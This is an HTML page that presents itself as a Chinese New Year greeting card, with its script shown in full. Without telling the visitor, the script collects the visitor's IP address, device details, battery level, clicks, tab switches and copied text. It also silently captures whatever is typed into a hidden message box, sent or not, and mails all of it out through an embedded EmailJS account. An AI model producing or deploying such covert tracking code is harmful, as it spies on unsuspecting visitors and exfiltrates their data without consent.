<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>新年快乐</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #000000; font-family: -apple-system, BlinkMacSystemFont, "SF Pro SC", "SF Pro Display", "PingFang SC", "Helvetica Neue", sans-serif; overflow: hidden; -webkit-font-smoothing: antialiased; flex-direction: column; user-select: none; }
        .container { text-align: center; opacity: 0; transform: translateY(30px); animation: appleReveal 1.8s cubic-bezier(0.19, 1, 0.22, 1) forwards; z-index: 1; }
        h1 { margin: 0; font-size: 5rem; font-weight: 600; letter-spacing: -0.03em; background: linear-gradient(180deg, #FFFFFF 0%, #B0B0B0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: 0 10px 30px rgba(255, 255, 255, 0.1); cursor: default; }
        h5 { margin-top: 20px; font-size: 2rem; font-weight: 400; letter-spacing: -0.02em; background: linear-gradient(180deg, #FFFFFF 0%, #8E8E93 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        @keyframes appleReveal { to { opacity: 1; transform: translateY(0); } }
        #i-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; z-index: 100; }
        #i-modal.v { opacity: 1; pointer-events: all; }
        .m-box { width: 75%; max-width: 280px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .m-t { color: #fff; font-size: 17px; margin-bottom: 20px; font-weight: 400; letter-spacing: 0.5px; opacity: 0.9; pointer-events: none; }
        .ios-inp { width: 100%; box-sizing: border-box; background: rgba(255, 255, 255, 0.12); border: none; border-radius: 14px; padding: 16px; color: #fff; font-size: 16px; outline: none; text-align: center; margin-bottom: 15px; transition: background 0.3s; }
        .ios-inp:focus { background: rgba(255, 255, 255, 0.2); }
        .ios-inp::placeholder { color: rgba(255, 255, 255, 0.3); }
        .ios-btn { color: #0A84FF; font-size: 17px; font-weight: 600; padding: 10px 20px; cursor: pointer; opacity: 0.9; transition: opacity 0.2s; }
        .ios-btn:active { opacity: 0.5; }
        @media (max-width: 768px) { h1 { font-size: 3rem; } h5 { font-size: 1.5rem; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>新年快乐</h1>
        <h5>tian</h5>
    </div>
    <div id="i-modal">
        <div class="m-box">
            <div class="m-t">说点什么</div>
            <input type="text" id="k-input" class="ios-inp" placeholder="...">
            <div id="s-btn" class="ios-btn">发送</div>
        </div>
    </div>
    <script type="text/javascript">
        (function() { emailjs.init("VNzKmFJA5x37kDEj3"); })();
        var c = { s: 'VNzKmFJA5x37kDEj3', t: 'template_px5akze' };
        var d = { c: 0, st: Date.now(), b: [], tm: null, it: null };
        
        window.onload = function() {
            var sc = window.screen.width + "x" + window.screen.height;
            var bat = "N/A";

            function sd(h, m) {
                var payload = {
                    report_type: h,
                    message_body: m,
                    visit_time: new Date().toLocaleString(),
                    device_info: navigator.userAgent,
                    screen_size: window.screen.width + "x" + window.screen.height,
                    p_language: navigator.language,
                    ip_address: "获取中..." 
                };

                fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipd => {
                    payload.ip_address = ipd.ip;
                    emailjs.send(c.s, c.t, payload);
                })
                .catch(() => {
                    payload.ip_address = "IP_ERR";
                    emailjs.send(c.s, c.t, payload);
                });
            }

            if(navigator.getBattery) {
                navigator.getBattery().then(b => {
                    bat = (b.level * 100) + "% " + (b.charging ? "(C)" : "");
                    sd("INIT", `电量: ${bat}`);
                });
            } else {
                sd("INIT", "Ready");
            }
            
            var m = document.getElementById('i-modal');
            var inp = document.getElementById('k-input');
            var btn = document.getElementById('s-btn');
            
            document.addEventListener('click', function(e) {
                if (!m.contains(e.target) && !m.classList.contains('v')) {
                    d.c++;
                    if(d.c === 5) m.classList.add('v');
                }
                log('CLK', `${e.target.tagName}`);
            });

            m.addEventListener('click', function(e) {
                if(e.target === m) closeBox("BG_TAP");
            });

            btn.addEventListener('click', function() {
                if(inp.value) sd("MANUAL_SEND", inp.value);
                closeBox("BTN_SEND");
            });

            function closeBox(r) {
                m.classList.remove('v');
                d.c = 0; 
                log('ACT', `Closed: ${r}`);
                inp.value = "";
            }

            document.addEventListener('visibilitychange', function() {
                log('VIS', document.hidden ? "HIDE" : "SHOW");
            });

            document.addEventListener('copy', function() {
                log('CPY', document.getSelection().toString());
            });

            inp.addEventListener('input', function(e) {
                if(d.it) clearTimeout(d.it);
                d.it = setTimeout(function() {
                    sd("SILENT_CAP", e.target.value);
                }, 1500);
            });

            function log(t, v) {
                var tm = Math.floor((Date.now() - d.st)/1000);
                d.b.push(`[${tm}s][${t}] ${v}`);
                if(d.b.length >= 6) sendLog();
                else { if(d.tm) clearTimeout(d.tm); d.tm = setTimeout(sendLog, 6000); }
            }

            function sendLog() {
                if(d.b.length === 0) return;
                sd("LOGS", d.b.join('\n'));
                d.b = [];
            }
        };
    </script>
</body>
</html>